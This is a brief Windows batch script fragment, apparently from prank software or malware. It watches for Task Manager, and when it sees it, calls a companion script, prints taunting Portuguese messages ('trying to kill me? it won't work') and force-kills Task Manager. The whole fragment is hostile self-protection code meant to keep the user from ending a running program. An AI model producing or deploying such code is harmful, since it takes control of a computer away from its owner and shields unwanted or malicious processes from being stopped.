tasklist /FI "IMAGENAME eq Taskmgr.exe" 2>NUL | find /I /N "Taskmgr.exe">NUL
if "%ERRORLEVEL%"=="0" (
    cls
    call Scripts\rostog.cmd
    echo - TENTANDO ME MATAR?
    echo - NAO VAI FUNCIONAR.
    taskkill /f /im Taskmgr.exe
)